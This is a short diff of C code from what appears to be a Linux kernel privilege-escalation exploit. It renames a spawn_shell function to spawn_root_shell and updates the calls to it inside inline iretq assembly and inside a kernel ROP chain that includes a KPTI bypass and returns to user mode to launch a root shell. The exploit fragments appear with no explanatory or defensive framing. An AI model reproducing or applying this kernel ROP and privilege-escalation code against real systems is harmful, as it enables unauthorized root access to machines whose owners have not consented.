@@ -3,7 +3,7 @@
 #include "util.h"
 #include "vars.h"
 
-void spawn_shell(void) {
+void spawn_root_shell(void) {
     uid_t uid = getuid();
     if (uid != 0) {
         printf("[-] failed to get root (uid: %d)\n", uid);
@@ -53,7 +53,7 @@ void restore_state(void) {
         "iretq;"
         ".att_syntax;"
         :
-        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(spawn_shell));
+        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(spawn_root_shell));
 }
 
 void escalate_privilege(void) {
@@ -79,7 +79,7 @@ void krop(u64 *ptr) {
     *ptr++ = bypass_kpti;
     *ptr++ = 0xdeadbeef;
     *ptr++ = 0xcafebabe;
-    *ptr++ = (u64)&spawn_shell;
+    *ptr++ = (u64)spawn_root_shell;
     *ptr++ = user_cs;
     *ptr++ = user_rflags;
     *ptr++ = user_rsp;
